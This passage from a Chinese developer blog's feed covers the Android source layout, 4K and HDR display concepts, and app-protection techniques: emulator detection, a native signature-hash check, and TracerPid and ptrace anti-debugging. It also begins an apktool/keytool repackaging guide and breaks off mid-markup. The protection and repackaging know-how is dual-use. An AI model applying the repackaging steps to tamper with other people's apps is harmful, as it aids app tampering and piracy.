      <link href="/2017/12/09/android%E6%BA%90%E7%A0%81%E7%BB%93%E6%9E%84/"/>
      <url>/2017/12/09/android%E6%BA%90%E7%A0%81%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="abi"><a href="#abi" class="headerlink" title="abi"></a>abi</h2><p>应用程序二进制接口（abi is application binary interface）</p><h2 id="art"><a href="#art" class="headerlink" title="art"></a>art</h2><p>Android运行时机制相关</p><h2 id="bionic"><a href="#bionic" class="headerlink" title="bionic"></a>bionic</h2><p>Linux内核中库</p><ul><li>libc    C库</li><li>limdl  动态链接库相关</li><li>libm  C数学函数，运算相关</li><li>libstdc＋＋ 标准C＋＋库</li></ul><h2 id="bootable"><a href="#bootable" class="headerlink" title="bootable"></a>bootable</h2><p>引导、安装程序，其他设备启动的东西</p><h2 id="build"><a href="#build" class="headerlink" title="build"></a>build</h2><p>build的时候的一些脚本和环境</p><h2 id="cts"><a href="#cts" class="headerlink" title="cts"></a>cts</h2><p>兼容性测试框架（compatibility test suite）<br>（没用过）</p><h2 id="dalvik"><a href="#dalvik" class="headerlink" title="dalvik"></a>dalvik</h2><p>Java虚拟机相关</p><h2 id="development"><a href="#development" class="headerlink" title="development"></a>development</h2><p>开发相关的工具，SDK、NDK等</p><h2 id="devices"><a href="#devices" class="headerlink" title="devices"></a>devices</h2><p>特定厂商的设备文件</p><h2 id="docs"><a href="#docs" class="headerlink" title="docs"></a>docs</h2><p>文档相关</p><h2 id="external"><a href="#external" class="headerlink" title="external"></a>external</h2><p>外部库和工具的源代码。Webkit，Sqlite，zlib等</p><h2 id="frameworks"><a href="#frameworks" class="headerlink" title="frameworks"></a>frameworks</h2><p>重要的目录之一。System Server、Package Manager、Activity Manager等关键服务的实现，java层到native层的映射</p><h2 id="hardware"><a href="#hardware" class="headerlink" title="hardware"></a>hardware</h2><p>部分厂家开源的硬件适配层（HAL）代码，Wifi、电源等</p><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><p>内核源码</p><h2 id="libcore"><a href="#libcore" class="headerlink" title="libcore"></a>libcore</h2><p>一些核心的库</p><ul><li>Dalvik</li><li>dom</li><li>expectations</li><li>include</li><li>json</li><li>luni</li><li>support</li><li>xml</li></ul><h2 id="libnativehelper"><a href="#libnativehelper" class="headerlink" title="libnativehelper"></a>libnativehelper</h2><p>没用过</p><h2 id="ndk"><a href="#ndk" class="headerlink" title="ndk"></a>ndk</h2><p>本地开发包</p><h2 id="out"><a href="#out" class="headerlink" title="out"></a>out</h2><p>编译完成后输出目录，out/target/product/genetic 目录存放编译完成的镜像。</p><h2 id="packages"><a href="#packages" class="headerlink" title="packages"></a>packages</h2><p>标准的应用程序，相机、短信、拨号等</p><h2 id="pdk"><a href="#pdk" class="headerlink" title="pdk"></a>pdk</h2><p>platform build kit，方便vendor适配最新android，避免碎片化</p><h2 id="prebuilt"><a href="#prebuilt" class="headerlink" title="prebuilt"></a>prebuilt</h2><p>预先编译好的二进制文件，例如交叉编译工具等</p><h2 id="sdk"><a href="#sdk" class="headerlink" title="sdk"></a>sdk</h2><p>开发环境</p><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>android核心系统，可以认为是一个微型的Linux系统，运行在Dalvik虚拟机和java层服务开启前，包含init进程</p><h2 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h2><p>gradle等工具</p><h2 id="vendor"><a href="#vendor" class="headerlink" title="vendor"></a>vendor</h2><p>厂商代码</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>apk反调试-模拟器检查-签名检测</title>
      <link href="/2017/12/09/apk%E5%8F%8D%E8%B0%83%E8%AF%95-%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%A3%80%E6%9F%A5-%E7%AD%BE%E5%90%8D%E6%A3%80%E6%B5%8B/"/>
      <url>/2017/12/09/apk%E5%8F%8D%E8%B0%83%E8%AF%95-%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%A3%80%E6%9F%A5-%E7%AD%BE%E5%90%8D%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="一、模拟器检测"><a href="#一、模拟器检测" class="headerlink" title="一、模拟器检测"></a>一、模拟器检测</h2><ol><li>基于模拟器的IMSI、IDS、默认文件等几个方面特征进行检测</li><li>基于CPU的检测（如是否包含inter、amd等字段）</li><li>电池信息、温度、电量变化等</li></ol><p>代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要添加android.permission.READ_PHONE_STATE权限</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmulatorByImei</span><span class="params">(Context context)</span></span>&#123;</span><br><span class="line">        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line">        String imei = tm.getDeviceId();</span><br><span class="line">        <span class="keyword">if</span> (imei == <span class="keyword">null</span> || imei.equals(<span class="string">"000000000000000"</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmulatorByBuildModel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.e(<span class="string">"MODEL="</span>, Build.MODEL);</span><br><span class="line">        Log.e(<span class="string">"MANUFACTURER="</span>,Build.MANUFACTURER);</span><br><span class="line">        <span class="keyword">return</span> ( Build.MODEL.equals(<span class="string">"sdk"</span>)) || (Build.MODEL.equals(<span class="string">"google_sdk"</span>) );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="二、签名监测-native"><a href="#二、签名监测-native" class="headerlink" title="二、签名监测(native)"></a>二、签名监测(native)</h2><p>签名检测在一般在java层实现，通过与远程服务器交互完成校验。如果没有本地校验，则尽可能在native层实现，这里利用反射的方式。</p><p>代码示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SignatureCheck</span><span class="params">(JNIEnv *env, jobject context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    jclass context_clazz = (*env)-&gt;GetObjectClass(env, context);<span class="comment">//Context的类</span></span><br><span class="line">    </span><br><span class="line">    jmethodID methodID_getPackageManager = (*env)-&gt;GetMethodID(env, context_clazz,<span class="string">"getPackageManager"</span>, <span class="string">"()Landroid/content/pm/PackageManager;"</span>);<span class="comment">// 得到 getPackageManager 方法的 ID</span></span><br><span class="line"></span><br><span class="line">    jobject packageManager = (*env)-&gt;CallObjectMethod(env, context,</span><br><span class="line">                                                      methodID_getPackageManager);<span class="comment">// 获得PackageManager对象</span></span><br><span class="line"></span><br><span class="line">    jclass pm_clazz = (*env)-&gt;GetObjectClass(env, packageManager);<span class="comment">// 获得 PackageManager 类</span></span><br><span class="line"></span><br><span class="line">    jmethodID methodID_pm = (*env)-&gt;GetMethodID(env, pm_clazz, <span class="string">"getPackageInfo"</span>,</span><br><span class="line">                                                <span class="string">"(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;"</span>);<span class="comment">// 得到 getPackageInfo 方法的 ID</span></span><br><span class="line"></span><br><span class="line">    jmethodID methodID_pack = (*env)-&gt;GetMethodID(env, context_clazz,</span><br><span class="line">                                                  <span class="string">"getPackageName"</span>, <span class="string">"()Ljava/lang/String;"</span>);<span class="comment">// 得到 getPackageName 方法的 ID</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    jstring application_package = (*env)-&gt;CallObjectMethod(env, context,</span><br><span class="line">                                                           methodID_pack);<span class="comment">// 获得当前应用的包名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *str = (*env)-&gt;GetStringUTFChars(env, application_package, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//__android_log_print(ANDROID_LOG_DEBUG, "JNI", "packageName: %s\n", str);</span></span><br><span class="line"></span><br><span class="line">    jobject packageInfo = (*env)-&gt;CallObjectMethod(env, packageManager,</span><br><span class="line">                                                   methodID_pm, application_package, <span class="number">64</span>);<span class="comment">// 获得PackageInfo</span></span><br><span class="line"></span><br><span class="line">    jclass packageinfo_clazz = (*env)-&gt;GetObjectClass(env, packageInfo);</span><br><span class="line">    jfieldID fieldID_signatures = (*env)-&gt;GetFieldID(env, packageinfo_clazz,</span><br><span class="line">                                                     <span class="string">"signatures"</span>, <span class="string">"[Landroid/content/pm/Signature;"</span>);</span><br><span class="line">    jobjectArray signature_arr = (jobjectArray)(*env)-&gt;GetObjectField(env,</span><br><span class="line">                                                                      packageInfo, fieldID_signatures);</span><br><span class="line"></span><br><span class="line">    jobject signature = (*env)-&gt;GetObjectArrayElement(env, signature_arr, <span class="number">0</span>);<span class="comment">//Signature数组中取出第一个元素</span></span><br><span class="line"></span><br><span class="line">    jclass signature_clazz = (*env)-&gt;GetObjectClass(env, signature);<span class="comment">//读signature的hashcode</span></span><br><span class="line">    jmethodID methodID_hashcode = (*env)-&gt;GetMethodID(env, signature_clazz,</span><br><span class="line">                                                      <span class="string">"hashCode"</span>, <span class="string">"()I"</span>);</span><br><span class="line">    jint hashCode = (*env)-&gt;CallIntMethod(env, signature, methodID_hashcode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//__android_log_print(ANDROID_LOG_DEBUG, "JNI", "hashcode: %d\n", hashCode);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hashCode != <span class="number">1133691199</span>)<span class="comment">//判断与自己签名的hashcode是否相同</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//__android_log_print(ANDROID_LOG_DEBUG, TAG, "Repackaged App, will exit :(",hashCode);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、反调试"><a href="#三、反调试" class="headerlink" title="三、反调试"></a>三、反调试</h2><h3 id="1-ptrace"><a href="#1-ptrace" class="headerlink" title="1. ptrace"></a>1. ptrace</h3><p>ida、gdb等调试工具其实都是使用ptrace进行的, ptrace有一个很重要的特定，一个进程只能被其它一个进程调试。当没有被调试时，/proc/(pid)/status文件中TracePid为0，即</p><p>（1） 如果TracePid不为0时，说明进程正在被调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">be_attached_check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> bufsize = <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">char</span> filename[bufsize];</span><br><span class="line">        <span class="keyword">char</span> line[bufsize];</span><br><span class="line">        <span class="keyword">int</span> pid = getpid();</span><br><span class="line">        <span class="built_in">sprintf</span>(filename, <span class="string">"/proc/%d/status"</span>, pid);</span><br><span class="line">        FILE* fd = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (fgets(line, bufsize, fd))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strncmp</span>(line, <span class="string">"TracerPid"</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> statue = atoi(&amp;line[<span class="number">10</span>]);</span><br><span class="line">                    <span class="comment">//LOGD("%s", line);</span></span><br><span class="line">                    <span class="keyword">if</span> (statue != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//LOGD("be attached !! kill %d", pid);</span></span><br><span class="line">                        fclose(fd);</span><br><span class="line">                        <span class="keyword">int</span> ret = kill(pid, SIGKILL);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose(fd);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            LOGD(<span class="string">"open %s fail..."</span>, filename);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2） 进程自己prace自己，就不会被第三方调试了。在jni_OnLoad函数中ptrace自身，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jint JNICALL <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* pVm, <span class="keyword">void</span>* reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    JNIEnv* env;</span><br><span class="line">    <span class="keyword">if</span> ((*pVm)-&gt;GetEnv(pVm, (<span class="keyword">void</span> **)&amp;env, JNI_VERSION_1_6)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-暗桩"><a href="#2-暗桩" class="headerlink" title="2. 暗桩"></a>2. 暗桩</h3><p>ptrace容易被逆向搞掉，暗桩是在多个地方插入检测代码，增加逆向难度，例如，新建一个进程每隔几秒检测一次：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread_task</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)<span class="comment">//进程每隔3秒检测一次</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//LOGD("start be_attached_check...");</span></span><br><span class="line">        be_attached_check();</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">anti_debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> pthread_id;</span><br><span class="line">    <span class="keyword">int</span> i,ret;</span><br><span class="line">    <span class="keyword">int</span> m=<span class="number">2</span>;</span><br><span class="line">    ret=pthread_create(&amp;pthread_id,<span class="literal">NULL</span>,(<span class="keyword">void</span> *)thread_task,(<span class="keyword">void</span> *)<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret!=<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"create pthread error!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-多个进程互相ptrace"><a href="#3-多个进程互相ptrace" class="headerlink" title="3. 多个进程互相ptrace"></a>3. 多个进程互相ptrace</h3>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关于分辨率、4k、色域色深、HDR</title>
      <link href="/2017/12/05/%E5%85%B3%E4%BA%8E4k%E6%8A%80%E6%9C%AF/"/>
      <url>/2017/12/05/%E5%85%B3%E4%BA%8E4k%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>解释4k技术，首先需要了解几个概念：</p><h4 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h4><p>分辨率，可以从显示分辨率与图像分辨率两个方向来分类。</p><h5 id="显示分辨率"><a href="#显示分辨率" class="headerlink" title="显示分辨率"></a>显示分辨率</h5><p>显示分辨率（屏幕分辨率）是屏幕图像的精密度，是指显示器所能显示的像素有多少。例如800×600的分辨率，是指在整个屏幕上水平显示800个像素，垂直显示600个像素。</p><p>显然，分辨率越高，显示屏可显示的像素就越多，图像就越清晰。</p><h5 id="图像分辨率"><a href="#图像分辨率" class="headerlink" title="图像分辨率"></a>图像分辨率</h5><p>图像分辨率指图像中存储的信息量，是每英寸图像内有多少个像素点，分辨率的单位为PPI(Pixels Per Inch)，通常叫做像素每英寸，图像分辨率的表达方式也为“水平像素数×垂直像素数”。</p><h5 id="图像分辨率和显示分辨率不匹配？"><a href="#图像分辨率和显示分辨率不匹配？" class="headerlink" title="图像分辨率和显示分辨率不匹配？"></a>图像分辨率和显示分辨率不匹配？</h5><p>显示器内部有一颗重要的集成电路叫Scaler IC，是专门用来处理当图像分辨率与显示器分辨率不同时的显示方式的。为便于理解，以具体例子来做说明。</p><p>如果图像分辨率小于显示器分辨率，如果仍以1:1显示，即一个像素对应一个像素，那屏幕就不会满屏。比如显卡输入640x480，而显示器为1280x1024，就会看到显示器左上角640x480的区块有清晰的图像，而其它剩余区域都是黑色的。为了实现满屏，就要实现图像的缩放(Scaling)，做法就是要给画面补足像素，水平方向640个像素须补足到1280个像素，垂直方向480个像素要补足到1024个像素，插入像素的插值算法取决于Scaler IC。</p><p>当图像的分辨率大于显示器时，则相反，不是补足而是要减少像素个数，这时图片的像素会被压缩，画面细节受到损失，细节分辨不清。例如用数码相机的屏幕也可以看到完整的照片，不过感觉很模糊，放在电脑上看就好多了，因为屏幕的分辨率低。</p><h4 id="4K技术"><a href="#4K技术" class="headerlink" title="4K技术"></a>4K技术</h4><p>4k技术通常指4K分辨率，即指水平方向每行像素值达到或者接近4096个，多数情况下特指4096*2160分辨率。我们通常说的2K分辨率为2048×1080，1080P的分辨率为1920×1080。</p><p>广义上来说，4K是一个完整的产业链，它至少包括了内容制作方、编解码标准制定方、宽带网络运营商、芯片解决方案商、终端配件生产商、终端商和屏幕厂商等，我们平时接触的狭义概念都是广义概念的一部分。</p><p>一下有几个概念：</p><h5 id="4k摄像机"><a href="#4k摄像机" class="headerlink" title="4k摄像机"></a>4k摄像机</h5><p>4K视频都是用4K摄像机拍摄的。4K摄像机内部有很多的感光器件，类似于数码相机里的感光元件，这些感光器件以一个矩形的样子排布，也就是在水平方向的每一行排列了3840个感光器件，一共有2160个这样的行，那么这个矩形上一共有 3840 * 2160 = 8294400 个感光器件。</p><p>为了拍摄成4K的效果，摄像师使用过去的高清摄像器材是不行的，需要使用更为专业的4K摄像器材，价格比较昂贵，而且拍一场4K的直播在其他方面的开销也是很多的，这也是为什么当前4K视频不多的原因之一。</p><h5 id="4k片源"><a href="#4k片源" class="headerlink" title="4k片源"></a>4k片源</h5><p>分辨率达到4096<em>2160的视频，一张未压缩过的4k图片大小约为4096</em>2160<em>3=26.54Mb，一个2小时的24帧/s的视频大小为：24（帧）</em>120（分钟）<em>60（秒）</em>50（MB）=8640000（MB）≈8.24（TB），但视频中帧之间的变化较小，通常会压缩，一部正常的4k电影大小为60G以上。</p><h5 id="4k传输"><a href="#4k传输" class="headerlink" title="4k传输"></a>4k传输</h5><p>由于4k视频比较大，因此传输起来也是非常消耗带宽的,这里引用一个数据：<br><img src="/images/pasted-167.png" alt="upload successful"></p><h5 id="4k播放器"><a href="#4k播放器" class="headerlink" title="4k播放器"></a>4k播放器</h5><p>播放器是用来视频解码的，解码分为软解码和硬解码：</p><p>硬件解码是图形芯片厂家提出的用 GPU 资源解码视频流的方案。与之相对的是软解，也就是传统的用 CPU 承担解码工作的方案。</p><p>现在主流的电视盒子都支持4k解码。</p><h5 id="4k显示器"><a href="#4k显示器" class="headerlink" title="4k显示器"></a>4k显示器</h5><p>4K显示器是指具备4K分辨率的显示器设备，分辨率有3840x2160和4096×2160像素2种超高分辨率规格。</p><p>目前，受成本及应用环境等因素制约，4K显示器的普及度并不高。这里的成本主要是面板的成本，在同样尺寸的液晶面板上增加像素点，就意味着坏点产生几率增加。同时，超高的分辨率对显卡提出了更高的要求，要在4K分辨率下进行娱乐应用体验，还需购置高端显卡，这增加了用户的负担。</p><h4 id="帧率"><a href="#帧率" class="headerlink" title="帧率"></a>帧率</h4><p>一秒钟的视频看起来是连续的，其实是由几十张图片构成的。这几十张图片按照先后顺序连续播放便形成了视频的效果。这些图片在视频技术里就叫做”帧”。</p><p>一般而言，如果一秒钟的视频帧率低于20帧，这段视频看上去就比较卡。要保持比较流畅的效果，帧率需要保持至少在25帧以上，此时人眼才感觉不出卡顿。对于4K视频而言，帧率有30有50也有60的。从观看效果来看，肯定是帧率60的看起来最流畅了。不过用60的帧率，视频的码率也会大一些，占用的带宽也大一些。</p><p>例如：在《比利·林恩》的宣传阶段，制片人等主创就强调影片120帧/4K/3D的制式能够给观众带来“极度清晰和真实的新视界”以及“全然实境的新体验”。</p><h4 id="色域和色深"><a href="#色域和色深" class="headerlink" title="色域和色深"></a>色域和色深</h4><p>色域是指能显示的颜色的范围，色深是颜色的表示精度。</p><h5 id="色域"><a href="#色域" class="headerlink" title="色域"></a>色域</h5><p>我们知道，自然界的光谱带很宽，但我们人眼能看到的只有很窄的一段频率的光，我们管这些频率的光叫可见光，下图是人眼可以感知的色彩范围：</p><p><img src="/images/pasted-168.png" alt="upload successful"></p><p>色域代表了显示器的色彩表现能力，色域越广的显示器色彩越丰富，表现出来的色彩就越接近真实世界和人眼的极限值，会给我们“更生动、更逼真”的感觉！</p><p>然而，显示器并没有这么大的空间，和人眼相比，显示器能够显示的色域更小。为了管理不同的计算机上的显示效果，为了得到统一的现实效果，业界制定了sRGB,NTSC,Adobe RGB等色彩管理标准。</p><p><img src="/images/pasted-170.png" alt="upload successful"></p><p>由于计算机很难显示全色域，所以很多显示器的宣传都是45% NTSC、72% NTSC以及100% sRGB，或者直接模糊的宣传“广色域”</p><h5 id="色深"><a href="#色深" class="headerlink" title="色深"></a>色深</h5><p>色深可以理解为如果将一定范围内的色域划分为N份，N用多少比特可以表示。</p><p>比如8位(bit)指的是一种基色可以有2的8次方（256）种等级，10bit就表示一种基色可以分为2的10次方（1024）种等级。把三基色能表示的色等级乘起来，就是能表示的色数，比如色深是12bit，也就是红绿蓝三种基色各有2的12次方（4096）种灰度等级，连乘起来就 是4096的3次方，也就是687亿色。</p><p>显示器的色深（或色阶）越高，色彩之间过渡会越平滑细腻，色深不够就会显得生硬，甚至会产生阶梯感。</p><h4 id="HDR"><a href="#HDR" class="headerlink" title="HDR"></a>HDR</h4><p>HDR是High Dynamic Range Imaging，简称HDRI或HDR，它将每个曝光瞬间相对应最佳细节的LDR图像（Low-Dynamic Range，低动态范围）合成为最终的HDR图像；通俗来说，就是将同一个画面进行多次曝光，再合成为一张图像。</p><p>例如：iphone的HDR开启后会连拍三张照片，分别对应欠曝光、正常曝光和过度曝光，然后把这三张图片合到一块并且突出每张照片最好的部分从而生成一张高质量的照片。</p><p>屏幕也有HDR概念，屏幕支持HDR，就是能尽量地显示更高的亮度，也能处理好更暗的暗度。图片和电视屏只要有一个不支持HDR技术，另外一个都无法发挥HDR优势。</p><p>对于电视机屏来说，支持HDR技术就意味着这块电视机屏幕能显示出+5档次到-5档次甚至更高区间的亮度与暗度。</p><p>电视机屏支持的明暗度范围最好是大于图片的明暗度范围。如果你的图片明暗度在+10到-10的档次区间，但是你电视机屏明度只支持+5到-5档次区间，那么对于图片的+10到+5档次区间明暗度和-5到-10档次区间的明暗度，电视机屏可能就显示不出来。</p><p>参考：</p><ol><li>图片分辨率和屏幕分辨率不一致将如何显示？ <a href="https://zhuanlan.zhihu.com/p/48206226" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/48206226</a></li><li>4K概念介绍——4K分辨率篇 <a href="https://zhuanlan.zhihu.com/p/49181772" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/49181772</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>重打包apk以及问题汇总</title>
      <link href="/2017/11/19/%E9%87%8D%E6%89%93%E5%8C%85apk%E7%9B%B8%E5%85%B3/"/>
      <url>/2017/11/19/%E9%87%8D%E6%89%93%E5%8C%85apk%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="重打包APK"><a href="#重打包APK" class="headerlink" title="重打包APK"></a>重打包APK</h2><p>反编译和编译使用Apktool (<a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="noopener">https://ibotpeaches.github.io/Apktool/</a>)</p><p>反编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d xxx.apk -o smali_path</span><br></pre></td></tr></table></figure></p><p>-r,–no-res    不解析资源文件<br>-s,–no-src    不解析代码文件</p><p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b smali_path -o new.apk</span><br></pre></td></tr></table></figure></p><p>签名：</p><ol><li>使用keytools生成一个私钥（keytool 位于 JDK 中的 bin/ 目录中）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -v -keystore my-release-key.jks</span><br><span class="line">-keyalg RSA -keysize 2048 -validity 10000 -alias my-alias</span><br></pre></td></tr></table></figure></li></ol><p>输入密码和“Distinguished Name”字段等其他信息后，会在当前目录生成一个私钥文件my-release-key.jks</p><ol><li>通过 apksigner 使用私钥对APK进行签名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 